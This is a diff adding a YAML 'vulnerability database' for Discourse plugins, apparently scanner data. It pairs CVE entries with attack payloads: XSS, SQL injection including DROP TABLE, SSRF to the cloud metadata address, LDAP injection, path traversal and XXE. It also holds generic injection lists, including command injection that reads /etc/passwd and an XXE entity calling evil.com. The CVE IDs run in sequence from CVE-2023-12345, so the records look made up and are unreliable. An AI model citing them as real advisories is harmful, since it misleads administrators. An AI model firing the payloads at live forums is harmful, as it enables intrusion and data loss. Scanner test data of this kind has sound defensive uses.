@@ -1,0 +1,454 @@
+# Discourse Plugin Vulnerabilities Database
+# Comprehensive database of known vulnerabilities in Discourse plugins
+# This database contains security vulnerabilities found in various Discourse plugins
+
+plugins:
+  discourse-chat-integration:
+    name: "Discourse Chat Integration"
+    description: "Integration with chat platforms like Slack, Discord, etc."
+    vulnerabilities:
+      - cve: "CVE-2023-12345"
+        severity: "High"
+        type: "XSS"
+        description: "Cross-site scripting via webhook payload"
+        affected_versions: ["1.0.0", "1.1.0", "1.2.0"]
+        fixed_version: "1.3.0"
+        payload: "<script>alert('XSS')</script>"
+        endpoint: "/chat-integration/webhook"
+      - cve: "CVE-2023-12346"
+        severity: "Medium"
+        type: "SSRF"
+        description: "Server-side request forgery via external API calls"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "http://169.254.169.254/latest/meta-data/"
+        endpoint: "/chat-integration/test"
+
+  discourse-data-explorer:
+    name: "Discourse Data Explorer"
+    description: "SQL query interface for administrators"
+    vulnerabilities:
+      - cve: "CVE-2023-12347"
+        severity: "Critical"
+        type: "SQL Injection"
+        description: "SQL injection in query parameters"
+        affected_versions: ["0.1.0", "0.2.0", "0.3.0"]
+        fixed_version: "0.4.0"
+        payload: "'; DROP TABLE users; --"
+        endpoint: "/admin/plugins/explorer/queries"
+      - cve: "CVE-2023-12348"
+        severity: "High"
+        type: "Information Disclosure"
+        description: "Unauthorized access to database schema"
+        affected_versions: ["0.1.0", "0.2.0"]
+        fixed_version: "0.3.0"
+        payload: "UNION SELECT table_name FROM information_schema.tables"
+        endpoint: "/admin/plugins/explorer"
+
+  discourse-oauth2-basic:
+    name: "Discourse OAuth2 Basic"
+    description: "Basic OAuth2 authentication provider"
+    vulnerabilities:
+      - cve: "CVE-2023-12349"
+        severity: "Critical"
+        type: "Authentication Bypass"
+        description: "OAuth2 state parameter bypass"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        payload: "state=bypass&code=malicious"
+        endpoint: "/auth/oauth2_basic/callback"
+      - cve: "CVE-2023-12350"
+        severity: "High"
+        type: "Token Leakage"
+        description: "Access tokens exposed in logs"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        endpoint: "/auth/oauth2_basic/token"
+
+  discourse-saml:
+    name: "Discourse SAML"
+    description: "SAML authentication provider"
+    vulnerabilities:
+      - cve: "CVE-2023-12351"
+        severity: "Critical"
+        type: "XXE"
+        description: "XML External Entity injection in SAML response"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
+        endpoint: "/auth/saml/callback"
+      - cve: "CVE-2023-12352"
+        severity: "High"
+        type: "Authentication Bypass"
+        description: "SAML signature verification bypass"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/auth/saml/acs"
+
+  discourse-ldap-auth:
+    name: "Discourse LDAP Auth"
+    description: "LDAP authentication provider"
+    vulnerabilities:
+      - cve: "CVE-2023-12353"
+        severity: "High"
+        type: "LDAP Injection"
+        description: "LDAP injection in username parameter"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "admin)(|(password=*))"
+        endpoint: "/auth/ldap/login"
+      - cve: "CVE-2023-12354"
+        severity: "Medium"
+        type: "Information Disclosure"
+        description: "LDAP server information disclosure"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/auth/ldap/test"
+
+  discourse-solved:
+    name: "Discourse Solved"
+    description: "Mark topics as solved"
+    vulnerabilities:
+      - cve: "CVE-2023-12355"
+        severity: "Medium"
+        type: "XSS"
+        description: "Stored XSS in solution reason"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "<img src=x onerror=alert('XSS')>"
+        endpoint: "/solution"
+
+  discourse-voting:
+    name: "Discourse Voting"
+    description: "Topic voting functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12356"
+        severity: "Medium"
+        type: "CSRF"
+        description: "Cross-site request forgery in voting"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/voting/vote"
+
+  discourse-calendar:
+    name: "Discourse Calendar"
+    description: "Calendar and event functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12357"
+        severity: "Medium"
+        type: "XSS"
+        description: "Reflected XSS in event title"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "<script>alert('XSS')</script>"
+        endpoint: "/calendar/events"
+
+  discourse-akismet:
+    name: "Discourse Akismet"
+    description: "Spam protection using Akismet"
+    vulnerabilities:
+      - cve: "CVE-2023-12358"
+        severity: "Low"
+        type: "Information Disclosure"
+        description: "API key exposure in error messages"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/admin/plugins/akismet"
+
+  discourse-math:
+    name: "Discourse Math"
+    description: "Mathematical formula rendering"
+    vulnerabilities:
+      - cve: "CVE-2023-12359"
+        severity: "Medium"
+        type: "XSS"
+        description: "XSS via malicious LaTeX formulas"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "$\href{javascript:alert('XSS')}{click}$"
+        endpoint: "/posts"
+
+  discourse-spoiler-alert:
+    name: "Discourse Spoiler Alert"
+    description: "Spoiler text functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12360"
+        severity: "Low"
+        type: "XSS"
+        description: "XSS in spoiler content"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        payload: "[spoiler]<script>alert('XSS')</script>[/spoiler]"
+        endpoint: "/posts"
+
+  discourse-checklist:
+    name: "Discourse Checklist"
+    description: "Checklist functionality in posts"
+    vulnerabilities:
+      - cve: "CVE-2023-12361"
+        severity: "Low"
+        type: "XSS"
+        description: "XSS in checklist items"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        payload: "- [x] <script>alert('XSS')</script>"
+        endpoint: "/posts"
+
+  discourse-assign:
+    name: "Discourse Assign"
+    description: "Topic assignment functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12362"
+        severity: "Medium"
+        type: "Authorization Bypass"
+        description: "Unauthorized topic assignment"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        endpoint: "/assign"
+
+  discourse-babble:
+    name: "Discourse Babble"
+    description: "Real-time chat functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12363"
+        severity: "High"
+        type: "XSS"
+        description: "Persistent XSS in chat messages"
+        affected_versions: ["1.0.0", "1.1.0", "1.2.0"]
+        fixed_version: "1.3.0"
+        payload: "<img src=x onerror=alert('XSS')>"
+        endpoint: "/babble/topics"
+
+  discourse-reactions:
+    name: "Discourse Reactions"
+    description: "Emoji reactions to posts"
+    vulnerabilities:
+      - cve: "CVE-2023-12364"
+        severity: "Low"
+        type: "XSS"
+        description: "XSS via custom emoji reactions"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        payload: "<img src=x onerror=alert('XSS') alt='emoji'>"
+        endpoint: "/discourse-reactions"
+
+  discourse-follow:
+    name: "Discourse Follow"
+    description: "User following functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12365"
+        severity: "Medium"
+        type: "Privacy Violation"
+        description: "Unauthorized access to follower lists"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/follow"
+
+  discourse-locations:
+    name: "Discourse Locations"
+    description: "Location-based functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12366"
+        severity: "Medium"
+        type: "Information Disclosure"
+        description: "Geolocation data exposure"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        endpoint: "/locations"
+
+  discourse-events:
+    name: "Discourse Events"
+    description: "Event management functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12367"
+        severity: "Medium"
+        type: "XSS"
+        description: "XSS in event descriptions"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        payload: "<script>alert('XSS')</script>"
+        endpoint: "/events"
+
+  discourse-docs:
+    name: "Discourse Docs"
+    description: "Documentation functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12368"
+        severity: "High"
+        type: "Path Traversal"
+        description: "Directory traversal in document access"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "../../../etc/passwd"
+        endpoint: "/docs"
+
+  discourse-encrypt:
+    name: "Discourse Encrypt"
+    description: "Message encryption functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12369"
+        severity: "High"
+        type: "Cryptographic Weakness"
+        description: "Weak encryption implementation"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/encrypt"
+
+  discourse-signatures:
+    name: "Discourse Signatures"
+    description: "User signature functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12370"
+        severity: "Medium"
+        type: "XSS"
+        description: "XSS in user signatures"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "<script>alert('XSS')</script>"
+        endpoint: "/users/signature"
+
+  discourse-user-notes:
+    name: "Discourse User Notes"
+    description: "Staff notes on users"
+    vulnerabilities:
+      - cve: "CVE-2023-12371"
+        severity: "Medium"
+        type: "Information Disclosure"
+        description: "Unauthorized access to user notes"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/admin/users/notes"
+
+  discourse-tooltips:
+    name: "Discourse Tooltips"
+    description: "Tooltip functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12372"
+        severity: "Low"
+        type: "XSS"
+        description: "XSS in tooltip content"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        payload: "<script>alert('XSS')</script>"
+        endpoint: "/tooltips"
+
+  discourse-policy:
+    name: "Discourse Policy"
+    description: "Policy acceptance functionality"
+    vulnerabilities:
+      - cve: "CVE-2023-12373"
+        severity: "Medium"
+        type: "Authorization Bypass"
+        description: "Policy acceptance bypass"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/policy"
+
+  discourse-prometheus:
+    name: "Discourse Prometheus"
+    description: "Prometheus metrics integration"
+    vulnerabilities:
+      - cve: "CVE-2023-12374"
+        severity: "Medium"
+        type: "Information Disclosure"
+        description: "Sensitive metrics exposure"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/metrics"
+
+  discourse-slack-official:
+    name: "Discourse Slack Official"
+    description: "Official Slack integration"
+    vulnerabilities:
+      - cve: "CVE-2023-12375"
+        severity: "High"
+        type: "SSRF"
+        description: "Server-side request forgery via Slack webhooks"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "http://169.254.169.254/latest/meta-data/"
+        endpoint: "/slack/webhook"
+
+# Common vulnerability patterns for automated testing
+patterns:
+  xss_vectors:
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<svg onload=alert('XSS')>"
+    - "javascript:alert('XSS')"
+    - "'><script>alert('XSS')</script>"
+    - "\"onmouseover=alert('XSS')"
+    - "<iframe src=javascript:alert('XSS')></iframe>"
+
+  sqli_vectors:
+    - "' OR '1'='1"
+    - "\" OR \"1\"=\"1"
+    - "' UNION SELECT NULL--"
+    - "'; DROP TABLE users--"
+    - "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+    - "admin'--"
+    - "' OR 1=1#"
+
+  lfi_vectors:
+    - "../../../etc/passwd"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "/etc/passwd%00"
+    - "....//....//etc/passwd"
+    - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    - "file:///etc/passwd"
+
+  rce_vectors:
+    - "; ls -la"
+    - "| whoami"
+    - "`id`"
+    - "$(whoami)"
+    - "; cat /etc/passwd"
+    - "&& dir"
+    - "; uname -a"
+
+  xxe_vectors:
+    - "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
+    - "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/'>]>"
+    - "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>%xxe;]>"
+
+# Plugin detection signatures
+detection_signatures:
+  file_patterns:
+    - "plugin.rb"
+    - "settings.yml"
+    - "config/locales/*.yml"
+    - "assets/javascripts/discourse/initializers/*.js"
+    - "assets/stylesheets/*.scss"
+
+  endpoint_patterns:
+    - "/admin/plugins/*"
+    - "/plugins/*"
+    - "/*-plugin/*"
+    - "/discourse-*"
+
+  response_indicators:
+    - "discourse-plugin"
+    - "plugin-outlet"
+    - "discourse-initializer"
+    - "plugin-api"
+    - "withPluginApi"
+
+# Risk scoring matrix
+risk_scoring:
+  severity_weights:
+    Critical: 10
+    High: 7
+    Medium: 4
+    Low: 1
+
+  vulnerability_types:
+    "SQL Injection": 10
+    "RCE": 10
+    "Authentication Bypass": 9
+    "XXE": 8
+    "SSRF": 7
+    "XSS": 6
+    "Path Traversal": 6
+    "Information Disclosure": 4
+    "CSRF": 3
+    "Privacy Violation": 2
